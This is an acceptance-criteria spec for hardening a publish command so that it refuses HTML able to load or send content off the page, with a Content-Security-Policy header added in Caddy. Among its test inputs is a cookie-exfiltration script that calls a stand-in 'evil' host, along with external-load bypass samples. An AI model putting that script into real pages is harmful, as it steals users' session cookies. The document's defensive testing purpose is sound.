# ns-5 acceptance (lite, T2)

Goal: `ns publish` refuses every HTML file that can load or send anything off the page (the four bypasses in issue #5 included), and the desk listeners send a Content-Security-Policy header as a second line of defence (R-DSK-2).

## Criteria

- AC-1: Each bypass from issue #5 is refused by `ns publish` with exit 1, the message `<name>: HTML must be self-contained ...`, and no copy on the desk. One bats case each in `tests/bats/desk.bats`: (a) `<link rel=stylesheet href=//evil/x.css>`; (b) `<script` then a newline then `src="https://x">`; (c) `<img src="https://x">`; (d) an inline `<script>fetch("https://evil/?"+document.cookie)</script>`. Check: `bats tests/bats/desk.bats` passes and these cases fail against `origin/main`'s `bin/lib/desk.sh`.
- AC-2: The check is multiline: a `src=` or `href=` on a later line than its tag (as in AC-1 b, and the same for `<link`) is refused. Covered by bats cases in `tests/bats/desk.bats`.
- AC-3: Any `<script` tag, with or without `src`, in any letter case, is refused. Bats case with `<SCRIPT>` (uppercase) in `tests/bats/desk.bats`.
- AC-4: A `src=` with an `http:`, `https:` or protocol-relative (`//`) URL, quoted or unquoted, on any element is refused. Bats cases for at least `src='//x'` and unquoted `src=http://x`.
- AC-5: Self-contained HTML is still published: the existing "inline style only" case passes, and a page with inline `<style>`, an `<img src="data:image/png;base64,...">` and an `<a href="https://github.com/o/r/pull/1">` link is published (exit 0, file on desk). The filled `plugins/ns/skills/handoff-report/template.html` (with `{{PR_URL}}` replaced by an https URL) passes `ns_desk_check_html`. Bats cases in `tests/bats/desk.bats`.
- AC-6: `templates/caddy/Caddyfile.tmpl` sets `header Content-Security-Policy "default-src 'none'; style-src 'unsafe-inline'; img-src data:"` in both the `@TS_HOST@:8443` block and the `http://127.0.0.1:8080` block, and not in the `@TS_HOST@` reverse-proxy block. Check: a bats case (in `tests/bats/bootstrap.bats` next to "the rendered Caddyfile has the desk ...", or in `desk.bats`) that renders the template and asserts the header in each of the two blocks; `caddy adapt --config <rendered>` exits 0 where `caddy` is installed.
- AC-7: Docs match the behaviour: `docs/usage.md` (the `ns publish` paragraph, which today lists only `<script src>`, `<link href="http...">` and `@import`) and `docs/spec.md` R-DSK-2 describe the new rules and the CSP header. Check: `tests/docs-check` passes and `grep -n 'Content-Security-Policy' docs/spec.md` finds R-DSK-2.
- AC-8: Gates stay green: `tests/lint` (shellcheck clean), `bats tests/bats` and `tests/docs-check` exit 0.

## Assumptions

- The issue's "reject `href=` with an http(s) URL" is read as resource-loading `href` (`<link>` and similar), not `<a href>` navigation links: the handoff report template links to the PR URL by design, and CSP does not govern navigation. If the owner wants every absolute `href` refused, the handoff template must change too.
- "Reject `//`" means protocol-relative URLs in `src=`/`href=`, not any `//` in text or inline CSS comments.
- `@import` stays refused (existing behaviour).
- Caddy's directory-browse page may lose its inline script features under the CSP; the listing itself still works. Acceptable.
- The CSP was already added by hand on ns-main (docs/build-plan.md); this change puts it in the template so `bootstrap.sh --upgrade` keeps it.

## Non-goals

- No change to the `@TS_HOST@` (port 443) reverse-proxy block or to the token check in `ns publish`.
- No HTML sanitising or rewriting; the check only accepts or refuses.
- No change to the `ns publish` CLI, the `.published` format or `index.md`.
